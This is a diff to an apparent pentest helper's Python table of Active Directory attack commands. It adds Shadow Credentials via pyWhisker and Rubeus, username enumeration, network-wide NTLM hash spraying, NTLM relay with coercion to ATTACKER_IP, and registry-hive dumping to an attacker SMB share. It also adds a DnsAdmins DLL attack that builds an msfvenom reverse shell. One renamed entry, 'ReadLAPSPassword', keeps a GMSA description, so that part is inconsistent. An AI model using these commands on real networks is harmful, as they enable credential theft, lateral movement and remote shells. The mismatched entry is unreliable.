@@ -217,7 +217,24 @@ ATTACKS = {
         ],
     },
 
-    "ReadGMSAPassword": {
+    "WriteKeyCredentialLink": {
+        "desc": "Shadow Credentials — add a key credential to the target, get their NT hash without changing their password",
+        "risk": "HIGH",
+        "attacks": [
+            {
+                "tool": "pyWhisker (Linux)",
+                "cmd": "# Add shadow credential:\npywhisker -a add -d {domain} -u {source} -p '{password}' --dc-ip {dc_ip} --target {target} --filename {target}_shadow\n\n# Get NT hash from the pfx:\npkinittools-gettgtpkinit {domain}/{target} -cert-pfx {target}_shadow.pfx -pfx-pass <GENERATED_PASS> {target}.ccache\nexport KRB5CCNAME={target}.ccache\npkinittools-getnthash {domain}/{target} -key <AS-REP_ENC_KEY>",
+                "note": "Cleaner than ForceChangePassword — target's password stays the same",
+            },
+            {
+                "tool": "Whisker (Windows foothold)",
+                "cmd": "Whisker.exe add /target:{target}\n# Whisker prints the Rubeus command — copy + run it:\nRubeus.exe asktgt /user:{target} /certificate:<BASE64> /password:<PASS> /nowrap\n# Then get NT hash:\nRubeus.exe changepw /ticket:<TGT> /new:FakeP@ss /noprint\n# Or use the TGT for PtT directly",
+                "note": "Windows-side Shadow Credentials via Rubeus",
+            },
+        ],
+    },
+
+    "ReadLAPSPassword": {
         "desc": "Can read the GMSA (Group Managed Service Account) password",
         "risk": "HIGH",
         "attacks": [
@@ -371,6 +388,115 @@ ATTACKS = {
 # ═══════════════════════════════════════════════════════════
 
 STANDALONE_ATTACKS = {
+
+    "User Enumeration (Pre-Creds)": {
+        "desc": "Enumerate valid usernames before you have any credentials",
+        "attacks": [
+            {
+                "tool": "kerbrute userenum",
+                "cmd": "kerbrute userenum -d {domain} --dc {dc_ip} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt",
+                "note": "Fastest way to build a user list with zero creds — required before AS-REP roasting",
+            },
+            {
+                "tool": "NXC RID brute (null/guest auth)",
+                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --rid-brute\n# Or null:\nnxc smb {dc_ip} -u '' -p '' --rid-brute",
+                "note": "Returns all accounts by RID — works when LDAP is locked down",
+            },
+            {
+                "tool": "NXC users-export",
+                "cmd": "nxc smb {dc_ip} -u 'Guest' -p '' --users-export users.txt",
+            },
+        ],
+    },
+
+    "Post-NTDS Hash Spray": {
+        "desc": "After dumping NTDS, spray hashes across the network to find where they work",
+        "attacks": [
+            {
+                "tool": "NXC — spray Administrator hash (local auth)",
+                "cmd": "nxc smb 192.168.1.0/24 -u Administrator -H '{hash}' --local-auth",
+                "note": "Finds every box where the same local admin hash works — common in flat networks",
+            },
+            {
+                "tool": "NXC — spray domain account hash",
+                "cmd": "nxc smb 192.168.1.0/24 -u {source} -H '{hash}' -d {domain}",
+            },
+            {
+                "tool": "NXC — test specific hash on specific target",
+                "cmd": "nxc smb {target} -u {source} -H '{hash}' -d {domain} -x 'whoami'",
+                "note": "Confirm access and run a command in one shot",
+            },
+            {
+                "tool": "NXC — find all local admins from hash list",
+                "cmd": "nxc smb 192.168.1.0/24 -u administrators.txt -H hashes.txt --local-auth --continue-on-success",
+            },
+        ],
+    },
+
+    "NTLM Relay (RBCD — no ADCS needed)": {
+        "desc": "Relay coerced NTLM auth to LDAP to write RBCD — works when ADCS isn't available",
+        "attacks": [
+            {
+                "tool": "Step 1 — Start ntlmrelayx to LDAP",
+                "cmd": "ntlmrelayx.py -t ldap://{dc_ip} --delegate-access --no-smb-server -smb2support",
+                "note": "Creates a machine account and sets RBCD automatically on success",
+            },
+            {
+                "tool": "Step 2 — Coerce target authentication",
+                "cmd": "nxc smb {target} -u {source} -p '{password}' -M coerce_plus -o LISTENER=ATTACKER_IP",
+            },
+            {
+                "tool": "Step 3 — Get impersonation ticket",
+                "cmd": "impacket-getST -spn 'cifs/{target}.{domain}' -impersonate Administrator '{domain}/EVIL$:P@ssw0rd' -dc-ip {dc_ip}\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass {target}.{domain}",
+                "note": "Machine account name + password printed by ntlmrelayx in step 1",
+            },
+        ],
+    },
+
+    "SeBackupPrivilege": {
+        "desc": "Dump SAM/SYSTEM/SECURITY registry hives — common on backup service accounts",
+        "attacks": [
+            {
+                "tool": "Evil-WinRM — reg save + download",
+                "cmd": "reg save hklm\\sam sam.hive\nreg save hklm\\system sys.hive\nreg save hklm\\security sec.hive\ndownload sam.hive\ndownload sys.hive\ndownload sec.hive",
+                "note": "Run inside evil-winrm shell",
+            },
+            {
+                "tool": "Impacket reg.py (remote)",
+                "cmd": "# Setup SMB server first:\nsmbserver.py -smb2support share .\n\n# Dump hives remotely:\nreg.py '{domain}/{source}:{password}'@{target} save -keyName 'HKLM\\SAM' -o '\\\\ATTACKER_IP\\share'\nreg.py '{domain}/{source}:{password}'@{target} save -keyName 'HKLM\\SYSTEM' -o '\\\\ATTACKER_IP\\share'\nreg.py '{domain}/{source}:{password}'@{target} save -keyName 'HKLM\\SECURITY' -o '\\\\ATTACKER_IP\\share'",
+                "note": "Impacket auto-enables SeBackupPrivilege if disabled",
+            },
+            {
+                "tool": "Parse hives offline",
+                "cmd": "secretsdump -system sys.hive -sam sam.hive -security sec.hive LOCAL",
+            },
+        ],
+    },
+
+    "DnsAdmins Abuse": {
+        "desc": "DnsAdmins group members can load a DLL into the DNS service (runs as SYSTEM)",
+        "attacks": [
+            {
+                "tool": "Step 1 — Generate malicious DLL",
+                "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o evil.dll\n# Or add yourself to local admins:\nmsfvenom -p windows/x64/exec CMD='net localgroup administrators {source} /add' -f dll -o evil.dll",
+            },
+            {
+                "tool": "Step 2 — Host on SMB share",
+                "cmd": "smbserver.py -smb2support share .",
+                "note": "DNS service will pull the DLL over SMB — must be reachable from the DC",
+            },
+            {
+                "tool": "Step 3 — Set DLL path + restart DNS",
+                "cmd": "# From Windows foothold (as DnsAdmins member):\ndnscmd /config /serverlevelplugindll \\\\ATTACKER_IP\\share\\evil.dll\nsc.exe stop dns\nsc.exe start dns",
+                "note": "DNS restart requires specific permissions — check with: sc.exe sdshow dns",
+            },
+            {
+                "tool": "Step 4 — Cleanup (remove plugin after getting shell)",
+                "cmd": "dnscmd /config /serverlevelplugindll \"\"\nsc.exe stop dns\nsc.exe start dns",
+                "note": "Always clean up — leaving a bad DLL will keep crashing DNS",
+            },
+        ],
+    },
 
     "Null Auth & Initial Enum": {
         "desc": "Check for unauthenticated access — null session, guest, anonymous LDAP",
